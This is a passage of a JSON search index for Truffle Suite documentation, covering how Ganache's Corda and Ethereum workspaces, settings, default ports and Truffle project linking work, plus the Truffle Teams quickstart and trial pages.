nodes/notaries.","title":"Nodes"},{"location":"docs/ganache/corda/nodes.html#related-documentation","text":"Corda Overview Transactions CorDapps Shell","title":"Related Documentation"},{"location":"docs/ganache/corda/shell.html","text":"Shell \u00b6 For Corda technical documentation not related to Ganache head over to Corda's official documentation . The Corda Shell screen provides Corda CRaSH shell access to each node and notary. You can issue commands such as flow list , dashboard , run gracefulShutdown , etc! The shell updates in real-time, just as if you SSHed into the shell yourself: Related Documentation \u00b6 Corda Overview Nodes","title":"Ganache | Corda Shell"},{"location":"docs/ganache/corda/shell.html#shell","text":"For Corda technical documentation not related to Ganache head over to Corda's official documentation . The Corda Shell screen provides Corda CRaSH shell access to each node and notary. You can issue commands such as flow list , dashboard , run gracefulShutdown , etc! The shell updates in real-time, just as if you SSHed into the shell yourself:","title":"Shell"},{"location":"docs/ganache/corda/shell.html#related-documentation","text":"Corda Overview Nodes","title":"Related Documentation"},{"location":"docs/ganache/corda/transactions.html","text":"Transactions \u00b6 For Corda technical documentation not related to Ganache head over to Corda's official documentation . The Corda Transactions screen displays a list of all transactions, filterable by node/notary. Clicking on a transaction opens the Transaction Details screen. From this screen you can find which CorDapp flows, attachments, and input and output states were involved in the transaction. Additionally, you can inspect each individual state. You can inspect the data in the state and learn about the transaction's participants (both known and anonymous), notaries, and for Linear States, dive into the state's history. Related Documentation \u00b6 Corda Overview Nodes CorDapps","title":"Ganache | Corda Transactions"},{"location":"docs/ganache/corda/transactions.html#transactions","text":"For Corda technical documentation not related to Ganache head over to Corda's official documentation . The Corda Transactions screen displays a list of all transactions, filterable by node/notary. Clicking on a transaction opens the Transaction Details screen. From this screen you can find which CorDapp flows, attachments, and input and output states were involved in the transaction. Additionally, you can inspect each individual state. You can inspect the data in the state and learn about the transaction's participants (both known and anonymous), notaries, and for Linear States, dive into the state's history.","title":"Transactions"},{"location":"docs/ganache/corda/transactions.html#related-documentation","text":"Corda Overview Nodes CorDapps","title":"Related Documentation"},{"location":"docs/ganache/corda/unlinking-a-corda-project.html","text":"Unlinking a Corda Project \u00b6 Warning: Once a Cordapp has been installed on a node, removing it can result in node start-up failure. For this reason, Ganache will _not_ remove installed CorDapps from existing nodes and notaries. If you no longer want a Corda project linked to a workspace, go to the WORKSPACE settings pane the same way you did when linking the project . To remove a Corda project from the workspace, click on the project folder in the PROJECTS list and then click the REMOVE PROJECT button. When you're done, click the SAVE AND RESTART ( SAVE WORKSPACE if this is a new workspace) button in the top right.","title":"Ganache | Unlinking a Corda Project"},{"location":"docs/ganache/corda/unlinking-a-corda-project.html#unlinking-a-corda-project","text":"Warning: Once a Cordapp has been installed on a node, removing it can result in node start-up failure. For this reason, Ganache will _not_ remove installed CorDapps from existing nodes and notaries. If you no longer want a Corda project linked to a workspace, go to the WORKSPACE settings pane the same way you did when linking the project . To remove a Corda project from the workspace, click on the project folder in the PROJECTS list and then click the REMOVE PROJECT button. When you're done, click the SAVE AND RESTART ( SAVE WORKSPACE if this is a new workspace) button in the top right.","title":"Unlinking a Corda Project"},{"location":"docs/ganache/corda/working-with-corda.html","text":"Working With Corda \u00b6 Ganache supports development with Corda, an Open Source Blockchain Platform for Business. It is highly recommended you checkout the official corda development documentation before getting started with Corda-flavored Ganache. If you haven't yet installed or updated Ganache to v2.4.0 or later go to Ganache Quickstart Guide . If you already have Ganache v2.4.0 or later installed head over to the Corda Workspace Overview .","title":"XYZ"},{"location":"docs/ganache/corda/working-with-corda.html#working-with-corda","text":"Ganache supports development with Corda, an Open Source Blockchain Platform for Business. It is highly recommended you checkout the official corda development documentation before getting started with Corda-flavored Ganache. If you haven't yet installed or updated Ganache to v2.4.0 or later go to Ganache Quickstart Guide . If you already have Ganache v2.4.0 or later installed head over to the Corda Workspace Overview .","title":"Working With Corda"},{"location":"docs/ganache/corda/workspace-overview.html","text":"Corda Workspace Overview \u00b6 For Corda technical documentation not related to Ganache head over to Corda's official documentation . Main Interface \u00b6 Once you've created a workspace, the screen will show some details about the nodes on the network. *Corda Nodes* There are five pages available: Nodes lists the nodes and notaries on the network. Transactions displays a list of all transactions CorDapps lists all CorDapp jars installed on the network. Shell provides Corda CRaSH shell access to each node and notary. Logs shows the logs for the Ganache server, nodes, and notaries, which is useful for debugging. You're Up and Running! \u00b6 This guide got you started with a zero-config personal Corda development network. If you have an existing CorDapp project whose CorDapp transactions you'd like tracked in this workspace, check out the Linking a CorDapp Project documentation . If you just need to customize some options and save this workspace for later, check out the Creating Workspaces documentation .","title":"Ganache | Corda Workspace Overview"},{"location":"docs/ganache/corda/workspace-overview.html#corda-workspace-overview","text":"For Corda technical documentation not related to Ganache head over to Corda's official documentation .","title":"Corda Workspace Overview"},{"location":"docs/ganache/corda/workspace-overview.html#main-interface","text":"Once you've created a workspace, the screen will show some details about the nodes on the network. *Corda Nodes* There are five pages available: Nodes lists the nodes and notaries on the network. Transactions displays a list of all transactions CorDapps lists all CorDapp jars installed on the network. Shell provides Corda CRaSH shell access to each node and notary. Logs shows the logs for the Ganache server, nodes, and notaries, which is useful for debugging.","title":"Main Interface"},{"location":"docs/ganache/corda/workspace-overview.html#youre-up-and-running","text":"This guide got you started with a zero-config personal Corda development network. If you have an existing CorDapp project whose CorDapp transactions you'd like tracked in this workspace, check out the Linking a CorDapp Project documentation . If you just need to customize some options and save this workspace for later, check out the Creating Workspaces documentation .","title":"You're Up and Running!"},{"location":"docs/ganache/reference/ganache-settings.html","text":"Ganache Settings \u00b6 You can change some features of the generated blockchain through the Settings pages, accessed by the gear icon in the top right corner. You'll also be prompted with the settings screen when created a New Workspace . The settings page will vary depending on whether you're developing on Ethereum or Corda . After updating your settings, don't forget to save your changes . *Accessing Ganache Settings* Ethereum \u00b6 Workspace sets the workspace name and shows the currently linked Truffle projects. See our more detailed docs on creating and deleting workspaces for more info. Server shows details about the network connection, including hostname, port, network ID, and whether to automatically mine each transaction into a block. These connection details need to match your Truffle configuration . Accounts & Keys sets details about the number of accounts created, and whether to use a specific mnemonic or let Ganache generate its own. Chain sets configuration details for the genesis and parameters of the generated blockchain, including gas limit and gas price. Advanced toggles Google Analytics, which is useful for the Ganache team to track usage of the application. About contains information on the currently installed version of Ganache, along with links to our website and the Ganache GitHub repository . Corda \u00b6 Workspace sets the workspace name and shows the currently linked Corda projects. See our more detailed docs on creating and deleting workspaces for more info. Nodes manages the nodes for the network. Notaries manages the notaries for the network. Advanced sets the default PostgreSQL port and toggles Google Analytics, which is useful for the team to improve Ganache based on anonymous usage metrics. About contains information on the currently installed version of Ganache, along with links to our website and the Ganache GitHub repository . Save your changes \u00b6 After making changes, you will have to click Restart on the application for the changes to take effect. *Ganache Settings* Configuring Truffle to connect to Ganache \u00b6 To configure Truffle connect to Ganache, edit truffle-config.js to point to the Ganache's IP and port, e.g., module.exports = { networks: { development: { host: \"localhost\", port: 7545, network_id: \"1234\" } // live: { ... } } }; Then you can run migration commands like truffle migrate --network development .","title":"Ganache | Ganache Settings"},{"location":"docs/ganache/reference/ganache-settings.html#ganache-settings","text":"You can change some features of the generated blockchain through the Settings pages, accessed by the gear icon in the top right corner. You'll also be prompted with the settings screen when created a New Workspace . The settings page will vary depending on whether you're developing on Ethereum or Corda . After updating your settings, don't forget to save your changes . *Accessing Ganache Settings*","title":"Ganache Settings"},{"location":"docs/ganache/reference/ganache-settings.html#ethereum","text":"Workspace sets the workspace name and shows the currently linked Truffle projects. See our more detailed docs on creating and deleting workspaces for more info. Server shows details about the network connection, including hostname, port, network ID, and whether to automatically mine each transaction into a block. These connection details need to match your Truffle configuration . Accounts & Keys sets details about the number of accounts created, and whether to use a specific mnemonic or let Ganache generate its own. Chain sets configuration details for the genesis and parameters of the generated blockchain, including gas limit and gas price. Advanced toggles Google Analytics, which is useful for the Ganache team to track usage of the application. About contains information on the currently installed version of Ganache, along with links to our website and the Ganache GitHub repository .","title":"Ethereum"},{"location":"docs/ganache/reference/ganache-settings.html#corda","text":"Workspace sets the workspace name and shows the currently linked Corda projects. See our more detailed docs on creating and deleting workspaces for more info. Nodes manages the nodes for the network. Notaries manages the notaries for the network. Advanced sets the default PostgreSQL port and toggles Google Analytics, which is useful for the team to improve Ganache based on anonymous usage metrics. About contains information on the currently installed version of Ganache, along with links to our website and the Ganache GitHub repository .","title":"Corda"},{"location":"docs/ganache/reference/ganache-settings.html#save-your-changes","text":"After making changes, you will have to click Restart on the application for the changes to take effect. *Ganache Settings*","title":"Save your changes"},{"location":"docs/ganache/reference/ganache-settings.html#configuring-truffle-to-connect-to-ganache","text":"To configure Truffle connect to Ganache, edit truffle-config.js to point to the Ganache's IP and port, e.g., module.exports = { networks: { development: { host: \"localhost\", port: 7545, network_id: \"1234\" } // live: { ... } } }; Then you can run migration commands like truffle migrate --network development .","title":"Configuring Truffle to connect to Ganache"},{"location":"docs/ganache/reference/workspace-default-configuration.html","text":"Workspace Default Configuration \u00b6 Every workspace has its own configuration. Each workspace's configuration is based off the Quickstart configuration at the time of workspace creation. While these can be changed, the Quickstart workspace starts with the below options: Ethereum \u00b6 Hostname: 127.0.0.1 - localhost Port Number: 7545 Network ID: 5777 Automine: true Error on Tx Failure: true Account Default Balance: 100 Total Accounts to Generate: 10 Autogenerate HD Mnemonic: false Lock Accounts: false Output Logs to File: false Verbose Logs: false However, during workspace creation, the Autogenerate HD Mnemonic is set to true to maintain the same set of accounts. Corda \u00b6 Postgres Port: 15432 Projects: [] Nodes: 3 Notaries: 1 Node 1: Name: O=Party A,L=London,C=GB RPC Port: 10000 Admin Port: 10001 P2P Port: 10002 CordApps: [] Nodes: [ O=Party B,L=Paris,C=FR O=Party C,L=New York,C=US ] SSHD Port: 11000 Version: 4.4 Node 2: Name: O=Party B,L=Paris,C=FR RPC Port: 10003 Admin Port: 10004 P2P Port: 10005 CordApps: [] Nodes: [ O=Party A,L=London,C=GB O=Party C,L=New York,C=US ] SSHD Port: 11003 Version: 4.4 Node 3: Name: O=Party C,L=New York,C=US RPC Port\": 10006 Admin Port: 10007 P2P Port: 10008 CordApps: [] Nodes: [ O=Party A,L=London,C=GB O=Party B,L=New York,C=US ], SSHD Port: 11006 Version: 4.4 Notary 1: Name: O=Notary Service,L=London,C=GB RPC Port: 10009 Admin Port: 10010 P2P Port: 10011 CordApps: [] SSHD Port: 11009 Version: 4.4","title":"Ganache | Workspace Default Configuration"},{"location":"docs/ganache/reference/workspace-default-configuration.html#workspace-default-configuration","text":"Every workspace has its own configuration. Each workspace's configuration is based off the Quickstart configuration at the time of workspace creation. While these can be changed, the Quickstart workspace starts with the below options:","title":"Workspace Default Configuration"},{"location":"docs/ganache/reference/workspace-default-configuration.html#ethereum","text":"Hostname: 127.0.0.1 - localhost Port Number: 7545 Network ID: 5777 Automine: true Error on Tx Failure: true Account Default Balance: 100 Total Accounts to Generate: 10 Autogenerate HD Mnemonic: false Lock Accounts: false Output Logs to File: false Verbose Logs: false However, during workspace creation, the Autogenerate HD Mnemonic is set to true to maintain the same set of accounts.","title":"Ethereum"},{"location":"docs/ganache/reference/workspace-default-configuration.html#corda","text":"Postgres Port: 15432 Projects: [] Nodes: 3 Notaries: 1 Node 1: Name: O=Party A,L=London,C=GB RPC Port: 10000 Admin Port: 10001 P2P Port: 10002 CordApps: [] Nodes: [ O=Party B,L=Paris,C=FR O=Party C,L=New York,C=US ] SSHD Port: 11000 Version: 4.4 Node 2: Name: O=Party B,L=Paris,C=FR RPC Port: 10003 Admin Port: 10004 P2P Port: 10005 CordApps: [] Nodes: [ O=Party A,L=London,C=GB O=Party C,L=New York,C=US ] SSHD Port: 11003 Version: 4.4 Node 3: Name: O=Party C,L=New York,C=US RPC Port\": 10006 Admin Port: 10007 P2P Port: 10008 CordApps: [] Nodes: [ O=Party A,L=London,C=GB O=Party B,L=New York,C=US ], SSHD Port: 11006 Version: 4.4 Notary 1: Name: O=Notary Service,L=London,C=GB RPC Port: 10009 Admin Port: 10010 P2P Port: 10011 CordApps: [] SSHD Port: 11009 Version: 4.4","title":"Corda"},{"location":"docs/ganache/truffle-projects/contracts-page.html","text":"Contracts Page \u00b6 The new contracts page contains a list of your smart contracts by project. At a glance we can see the contract's name, address, transaction count, and deployment status. Clicking one of the contracts will show more details about that contract including its creation transaction, storage (state), transactions, and events.","title":"Ganache | Contracts Page"},{"location":"docs/ganache/truffle-projects/contracts-page.html#contracts-page","text":"The new contracts page contains a list of your smart contracts by project. At a glance we can see the contract's name, address, transaction count, and deployment status. Clicking one of the contracts will show more details about that contract including its creation transaction, storage (state), transactions, and events.","title":"Contracts Page"},{"location":"docs/ganache/truffle-projects/decoded-transactions.html","text":"Decoded Transactions \u00b6 Ganache will now attempt to decode transactions that are contract calls. In addition to listing the events (encoded or not) for the transaction, Ganache will show the function signature of the transaction as well as the values of the arguments. Why aren't my transactions being decoded? Check and make sure you've added the corresponding Truffle project with the contract that the transaction is being interacted with.","title":"Ganache | Decoded Transactions"},{"location":"docs/ganache/truffle-projects/decoded-transactions.html#decoded-transactions","text":"Ganache will now attempt to decode transactions that are contract calls. In addition to listing the events (encoded or not) for the transaction, Ganache will show the function signature of the transaction as well as the values of the arguments. Why aren't my transactions being decoded? Check and make sure you've added the corresponding Truffle project with the contract that the transaction is being interacted with.","title":"Decoded Transactions"},{"location":"docs/ganache/truffle-projects/events-page.html","text":"Events Page \u00b6 The new events page shows the events that have fired during this chain's life. We'll try to decode the events if possible. A decoded event will show its name, the emitting contract, hash of the transaction it appears in, log index, and block time. Encoded events will not display decoded names (they appear instead with the generic name Encoded Event ) or contract names. Why aren't my events being decoded? Check and make sure you've added the corresponding Truffle project with the contract that defines that event. Clicking a decoded contract will reveal more information about the event including its return values and signature.","title":"Ganache | Events Page"},{"location":"docs/ganache/truffle-projects/events-page.html#events-page","text":"The new events page shows the events that have fired during this chain's life. We'll try to decode the events if possible. A decoded event will show its name, the emitting contract, hash of the transaction it appears in, log index, and block time. Encoded events will not display decoded names (they appear instead with the generic name Encoded Event ) or contract names. Why aren't my events being decoded? Check and make sure you've added the corresponding Truffle project with the contract that defines that event. Clicking a decoded contract will reveal more information about the event including its return values and signature.","title":"Events Page"},{"location":"docs/ganache/truffle-projects/linking-a-truffle-project.html","text":"Linking a Truffle Project \u00b6 To link a project, enter the settings by clicking the gear icon in the upper right. You should be seeing the WORKSPACE settings pane; if not, you can get there by clicking the WORKSPACE tab in the top left. From here, there is a section labeled TRUFFLE PROJECTS . Beneath this box, click the button ADD PROJECT . A file selection popup will appear. Navigate to the folder of your Truffle project, and select the truffle-config.js or truffle.js configuration file. The file you pick must be either named truffle-config.js or truffle.js for Ganache to correctly load it. After selecting the file, you'll see it listed in the TRUFFLE PROJECTS section. You can add multiple projects to a workspace. After you're finished adding projects you can click the SAVE AND RESTART ( SAVE WORKSPACE if this is a new workspace) button in the top right.","title":"Ganache | Linking a Truffle Project"},{"location":"docs/ganache/truffle-projects/linking-a-truffle-project.html#linking-a-truffle-project","text":"To link a project, enter the settings by clicking the gear icon in the upper right. You should be seeing the WORKSPACE settings pane; if not, you can get there by clicking the WORKSPACE tab in the top left. From here, there is a section labeled TRUFFLE PROJECTS . Beneath this box, click the button ADD PROJECT . A file selection popup will appear. Navigate to the folder of your Truffle project, and select the truffle-config.js or truffle.js configuration file. The file you pick must be either named truffle-config.js or truffle.js for Ganache to correctly load it. After selecting the file, you'll see it listed in the TRUFFLE PROJECTS section. You can add multiple projects to a workspace. After you're finished adding projects you can click the SAVE AND RESTART ( SAVE WORKSPACE if this is a new workspace) button in the top right.","title":"Linking a Truffle Project"},{"location":"docs/ganache/truffle-projects/unlinking-a-truffle-project.html","text":"Unlinking a Truffle Project \u00b6 If you no longer want a Truffle project linked to a workspace, go to the WORKSPACE settings pane the same way you did when linking the project . To remove/unlink a Truffle project from the workspace, click on the project file in the TRUFFLE PROJECTS list and then click the REMOVE PROJECT button. When you're done, click the SAVE AND RESTART ( SAVE WORKSPACE if this is a new workspace) button in the top right.","title":"Ganache | Unlinking a Truffle Project"},{"location":"docs/ganache/truffle-projects/unlinking-a-truffle-project.html#unlinking-a-truffle-project","text":"If you no longer want a Truffle project linked to a workspace, go to the WORKSPACE settings pane the same way you did when linking the project . To remove/unlink a Truffle project from the workspace, click on the project file in the TRUFFLE PROJECTS list and then click the REMOVE PROJECT button. When you're done, click the SAVE AND RESTART ( SAVE WORKSPACE if this is a new workspace) button in the top right.","title":"Unlinking a Truffle Project"},{"location":"docs/ganache/workspaces/creating-workspaces.html","text":"Creating Workspaces \u00b6 The Quickstart workspace is great for getting a development blockchain up and running instantly, but for projects already in progress, or users who need custom configurations, we provide two ways to create a full workspace. See Saving the Current Quickstart Blockchain as a New Workspace if you've already created a quickstart workspace and are ready to add projects or make customizations. If you're starting fresh check out Creating a Workspace from Scratch . Saving the Current Quickstart Blockchain as a New Workspace \u00b6 As mentioned above, a quickstart workspace resets the blockchain on every restart. Perhaps you've found yourself prototyping in a quickstart workspace to try out a couple of things, but then we want to save the blockchain as a new workspace for later recall. To accomplish this, click the SAVE button near the upper right of the screen when in a quickstart workspace. Creating a Workspace From Scratch \u00b6 You can also create a workspace from the home screen. Selecting either Ethereum or Corda from the NEW WORKSPACE dropdown then clicking the NEW WORKSPACE button on the home screen will take us to the options screen to configure your workspace . Workspace Configuration \u00b6 A workspace name will be randomly generated for you, but you can go ahead and change it. You can also change any of the other configuration options. When you're ready to start the new workspace, click SAVE WORKSPACE in the top right corner. You will be taken to the home screen. Notice the name of your new workspace near the upper right.","title":"Ganache | Creating Workspaces"},{"location":"docs/ganache/workspaces/creating-workspaces.html#creating-workspaces","text":"The Quickstart workspace is great for getting a development blockchain up and running instantly, but for projects already in progress, or users who need custom configurations, we provide two ways to create a full workspace. See Saving the Current Quickstart Blockchain as a New Workspace if you've already created a quickstart workspace and are ready to add projects or make customizations. If you're starting fresh check out Creating a Workspace from Scratch .","title":"Creating Workspaces"},{"location":"docs/ganache/workspaces/creating-workspaces.html#saving-the-current-quickstart-blockchain-as-a-new-workspace","text":"As mentioned above, a quickstart workspace resets the blockchain on every restart. Perhaps you've found yourself prototyping in a quickstart workspace to try out a couple of things, but then we want to save the blockchain as a new workspace for later recall. To accomplish this, click the SAVE button near the upper right of the screen when in a quickstart workspace.","title":"Saving the Current Quickstart Blockchain as a New Workspace"},{"location":"docs/ganache/workspaces/creating-workspaces.html#creating-a-workspace-from-scratch","text":"You can also create a workspace from the home screen. Selecting either Ethereum or Corda from the NEW WORKSPACE dropdown then clicking the NEW WORKSPACE button on the home screen will take us to the options screen to configure your workspace .","title":"Creating a Workspace From Scratch"},{"location":"docs/ganache/workspaces/creating-workspaces.html#workspace-configuration","text":"A workspace name will be randomly generated for you, but you can go ahead and change it. You can also change any of the other configuration options. When you're ready to start the new workspace, click SAVE WORKSPACE in the top right corner. You will be taken to the home screen. Notice the name of your new workspace near the upper right.","title":"Workspace Configuration"},{"location":"docs/ganache/workspaces/deleting-workspaces.html","text":"Deleting Workspaces \u00b6 To delete a workspace, from the home screen, hover over the workspace name and click the trash can icon on the right hand side. From there you'll see a prompt asking you to confirm the deletion. Click REMOVE to delete the workspace. This action is irreversible! While your linked projects will remain safe and unchanged, the blockchain data (i.e. blocks, transactions, events, etc.) will be deleted.","title":"Ganache | Deleting Workspaces"},{"location":"docs/ganache/workspaces/deleting-workspaces.html#deleting-workspaces","text":"To delete a workspace, from the home screen, hover over the workspace name and click the trash can icon on the right hand side. From there you'll see a prompt asking you to confirm the deletion. Click REMOVE to delete the workspace. This action is irreversible! While your linked projects will remain safe and unchanged, the blockchain data (i.e. blocks, transactions, events, etc.) will be deleted.","title":"Deleting Workspaces"},{"location":"docs/ganache/workspaces/editing-workspaces.html","text":"Editing Workspaces \u00b6 To edit a workspace without loading it first, from the home screen, hover over the workspace name and click the settings icon on the right hand side. You'll then be able to reconfigure your existing workspace .","title":"Ganache | Editing Workspaces"},{"location":"docs/ganache/workspaces/editing-workspaces.html#editing-workspaces","text":"To edit a workspace without loading it first, from the home screen, hover over the workspace name and click the settings icon on the right hand side. You'll then be able to reconfigure your existing workspace .","title":"Editing Workspaces"},{"location":"docs/ganache/workspaces/ethereum-workspace-overview.html","text":"Ethereum Workspace Overview \u00b6 Main Interface \u00b6 Once you've created a workspace, the screen will show some details about the server, and also list out a number of accounts. Each account is given 100 ether . Having ether automatically in all accounts allows you to focus on developing your application. *Local Accounts* There are six pages available: Accounts shows the accounts generated and their balances. This is the default view. Blocks shows each block as mined on the blockchain, along with gas used and transactions. Transactions lists all transactions run against the blockchain. Contracts lists the contracts contained in your workspace's Truffle projects. For more information on how Ganache handles contracts, see our Contracts Page documentation . Events lists all events that have been triggered since this workspace's creation. Ganache will attempt to decode events triggered by contracts in your Truffle project. For more information on events, see our Events Page documentation . Logs shows the logs for the server, which is useful for debugging. Also note that you can search for block numbers or transaction hashes from a search box at the top. You're Up and Running! \u00b6 This guide got you started with a zero-config personal Ethereum development blockchain. If you have an existing Truffle project whose contracts and events you'd like tracked in this workspace, check out the Linking a Truffle Project documentation . If you just need to customize some options and save this workspace for later, check out the Creating Workspaces documentation .","title":"Ganache | Ethereum Workspace Overview"},{"location":"docs/ganache/workspaces/ethereum-workspace-overview.html#ethereum-workspace-overview","text":"","title":"Ethereum Workspace Overview"},{"location":"docs/ganache/workspaces/ethereum-workspace-overview.html#main-interface","text":"Once you've created a workspace, the screen will show some details about the server, and also list out a number of accounts. Each account is given 100 ether . Having ether automatically in all accounts allows you to focus on developing your application. *Local Accounts* There are six pages available: Accounts shows the accounts generated and their balances. This is the default view. Blocks shows each block as mined on the blockchain, along with gas used and transactions. Transactions lists all transactions run against the blockchain. Contracts lists the contracts contained in your workspace's Truffle projects. For more information on how Ganache handles contracts, see our Contracts Page documentation . Events lists all events that have been triggered since this workspace's creation. Ganache will attempt to decode events triggered by contracts in your Truffle project. For more information on events, see our Events Page documentation . Logs shows the logs for the server, which is useful for debugging. Also note that you can search for block numbers or transaction hashes from a search box at the top.","title":"Main Interface"},{"location":"docs/ganache/workspaces/ethereum-workspace-overview.html#youre-up-and-running","text":"This guide got you started with a zero-config personal Ethereum development blockchain. If you have an existing Truffle project whose contracts and events you'd like tracked in this workspace, check out the Linking a Truffle Project documentation . If you just need to customize some options and save this workspace for later, check out the Creating Workspaces documentation .","title":"You're Up and Running!"},{"location":"docs/ganache/workspaces/loading-existing-workspaces.html","text":"Loading Existing Workspaces \u00b6 After at least one workspace has been created, the home screen will now have a list of workspaces for you to choose from. You can scroll through the list to find the desired workspace, and then load the workspace by clicking its name. You will be taken to the main screen. You'll notice that the blockchain state picked up from where you left off (i.e. mnemonic, accounts, associated balances, block height, transactions, etc.).","title":"Ganache | Loading Existing Workspaces"},{"location":"docs/ganache/workspaces/loading-existing-workspaces.html#loading-existing-workspaces","text":"After at least one workspace has been created, the home screen will now have a list of workspaces for you to choose from. You can scroll through the list to find the desired workspace, and then load the workspace by clicking its name. You will be taken to the main screen. You'll notice that the blockchain state picked up from where you left off (i.e. mnemonic, accounts, associated balances, block height, transactions, etc.).","title":"Loading Existing Workspaces"},{"location":"docs/ganache/workspaces/switching-workspaces.html","text":"Switching Workspaces \u00b6 To switch workspaces, click the SWITCH button near the upper right of the screen. You'll be taken to the home screen where you can select a different existing workspace or create a new one.","title":"Ganache | Switching Workspaces"},{"location":"docs/ganache/workspaces/switching-workspaces.html#switching-workspaces","text":"To switch workspaces, click the SWITCH button near the upper right of the screen. You'll be taken to the home screen where you can select a different existing workspace or create a new one.","title":"Switching Workspaces"},{"location":"docs/ganache/workspaces/the-quickstart-workspace.html","text":"The Quickstart Workspace \u00b6 The QUICKSTART button on the home screen opens an Ethereum or Corda quickstart workspace, depending on which technology is selected. This workspace is meant to provide a clean slate for prototype development.","title":"Ganache | The Quickstart Workspace"},{"location":"docs/ganache/workspaces/the-quickstart-workspace.html#the-quickstart-workspace","text":"The QUICKSTART button on the home screen opens an Ethereum or Corda quickstart workspace, depending on which technology is selected. This workspace is meant to provide a clean slate for prototype development.","title":"The Quickstart Workspace"},{"location":"docs/teams/overview.html","text":"SIGN UP WITH GITHUB GET NOTIFIED OF UPDATES & NEW FEATURES Truffle Teams Overview \u00b6 Manage and monitor the health of your blockchain-enabled application. Truffle integrated. Built for open source and enterprise. Features include: Dapp Tracking and Data: Get an overview of test statuses across multiple projects at a glance. Badges give visitors to your repository the assurance your dapp's contracts pass muster. Zero Config Continuous Integration: With no configuration required, test on every commit for maximum confidence in your Solidity code. Truffle Teams removes environmental inconsistencies by providing a unified environment for continuous smart contract testing. Automated Deployments: Adding Truffle Teams to your worflow is as easy as pushing to GitHub. Execute tests automatically while freeing up developer time and system resources. Smart Contract Management: Monitor a deployed smart contract's transactions, state, and events. View the build history and current status in the workflow.","title":"Truffle Teams | Overview"},{"location":"docs/teams/overview.html#truffle-teams-overview","text":"Manage and monitor the health of your blockchain-enabled application. Truffle integrated. Built for open source and enterprise. Features include: Dapp Tracking and Data: Get an overview of test statuses across multiple projects at a glance. Badges give visitors to your repository the assurance your dapp's contracts pass muster. Zero Config Continuous Integration: With no configuration required, test on every commit for maximum confidence in your Solidity code. Truffle Teams removes environmental inconsistencies by providing a unified environment for continuous smart contract testing. Automated Deployments: Adding Truffle Teams to your worflow is as easy as pushing to GitHub. Execute tests automatically while freeing up developer time and system resources. Smart Contract Management: Monitor a deployed smart contract's transactions, state, and events. View the build history and current status in the workflow.","title":"Truffle Teams Overview"},{"location":"docs/teams/quickstart.html","text":"Truffle Teams quickstart \u00b6 This page will take you through the basics of creating a Truffle Teams account and linking it to a Truffle project repository. Note : Before you begin, make sure you have a GitHub repository containing a Truffle project. Table of contents \u00b6 Creating an account Starting builds Deploying contracts Creating an account \u00b6 To start, navigate to https://my.truffleteams.com . Click on LOGIN WITH GITHUB . If you're not already logged in to your GitHub account, Github will prompt you to do so. If you are a member of any organizations other than your personal account, you'll be prompted to select an org to continue with installation. Orgs with an existing Truffle Teams installation will have a Configure > link. Next you'll be asked for permission to link Truffle Teams to one or more of your GitHub repositories. Select the repositories you wish to add and click continue. Select either All repositories to add all repos in this account/org to teams or Only select repositories to select individual repos from the dropdown. Note : We can always add a repo later if necessary. See the Adding repositories documentation for more informaiton. Finally, click Install to install Truffle Teams on the selected repositories. Why do we need certain permissions? Please see the Permissions disclosure section for a full breakdown of why we're asking for each permission. We then arrive at the home screen and see the repos we've added--let's commit some code and see how Truffle Teams will automatically run our tests! Starting builds \u00b6 Builds will start automatically once a new commit is pushed to any branch of a repository added to Truffle Teams. You will see the build queued in both the Truffle Teams interface on the BUILDS page and on GitHub with the commit itself. Deploying contracts \u00b6 Please see our detailed tutorial, \"Learning to Deploy with Truffle Teams\" . Continue learning \u00b6 This quickstart showed you the basics of the Truffle Teams testing workflow, but once your contracts are deployed there's more to learn about monitoring deployed contracts . We're in a cycle of rapid development; constantly adding new features and refining existing ones. If you run into any glitches or bugs, please raise an issue on the Truffle Teams GitHub repository . To get notified of the latest updates consider signing up for the Truffle Teams mailing list .","title":"Teams | Truffle Teams quickstart"},{"location":"docs/teams/quickstart.html#truffle-teams-quickstart","text":"This page will take you through the basics of creating a Truffle Teams account and linking it to a Truffle project repository. Note : Before you begin, make sure you have a GitHub repository containing a Truffle project.","title":"Truffle Teams quickstart"},{"location":"docs/teams/quickstart.html#table-of-contents","text":"Creating an account Starting builds Deploying contracts","title":"Table of contents"},{"location":"docs/teams/quickstart.html#creating-an-account","text":"To start, navigate to https://my.truffleteams.com . Click on LOGIN WITH GITHUB . If you're not already logged in to your GitHub account, Github will prompt you to do so. If you are a member of any organizations other than your personal account, you'll be prompted to select an org to continue with installation. Orgs with an existing Truffle Teams installation will have a Configure > link. Next you'll be asked for permission to link Truffle Teams to one or more of your GitHub repositories. Select the repositories you wish to add and click continue. Select either All repositories to add all repos in this account/org to teams or Only select repositories to select individual repos from the dropdown. Note : We can always add a repo later if necessary. See the Adding repositories documentation for more informaiton. Finally, click Install to install Truffle Teams on the selected repositories. Why do we need certain permissions? Please see the Permissions disclosure section for a full breakdown of why we're asking for each permission. We then arrive at the home screen and see the repos we've added--let's commit some code and see how Truffle Teams will automatically run our tests!","title":"Creating an account"},{"location":"docs/teams/quickstart.html#starting-builds","text":"Builds will start automatically once a new commit is pushed to any branch of a repository added to Truffle Teams. You will see the build queued in both the Truffle Teams interface on the BUILDS page and on GitHub with the commit itself.","title":"Starting builds"},{"location":"docs/teams/quickstart.html#deploying-contracts","text":"Please see our detailed tutorial, \"Learning to Deploy with Truffle Teams\" .","title":"Deploying contracts"},{"location":"docs/teams/quickstart.html#continue-learning","text":"This quickstart showed you the basics of the Truffle Teams testing workflow, but once your contracts are deployed there's more to learn about monitoring deployed contracts . We're in a cycle of rapid development; constantly adding new features and refining existing ones. If you run into any glitches or bugs, please raise an issue on the Truffle Teams GitHub repository . To get notified of the latest updates consider signing up for the Truffle Teams mailing list .","title":"Continue learning"},{"location":"docs/teams/account/claim-a-1-month-trial.html","text":"Claim a 1-month trial \u00b6 Every Truffle Teams account is eligible for a free 1-month trial that includes all Pro features. Navigate to your account settings by clicking on your username or GitHub avatar in the sidebar. If you're apart of one or many organizations, a list of the the organizations you belong to will appear in the sidebar. You can click on the organization's name or or GitHub avatar to view and/or manage the organization's settings. You should now see the BILLLING settings page for the selected account. If this account is still eligible for a trial, you'll be able to see and click on CLAIM TRIAL to claim your free 1 month pro trial. Claim a 1-month trial","title":"Teams | Claim a 1-month trial"},{"location":"docs/teams/account/claim-a-1-month-trial.html#claim-a-1-month-trial","text":"Every Truffle Teams account is eligible for a free 1-month trial that includes all Pro features. Navigate to your account settings by clicking on your username or GitHub avatar in the sidebar. If you're apart of one or many organizations, a list of the the organizations you belong to will appear in the sidebar. You can click on the organization's name or or GitHub avatar to view and/or manage the organization's settings. You should now see the BILLLING settings page for the selected account. 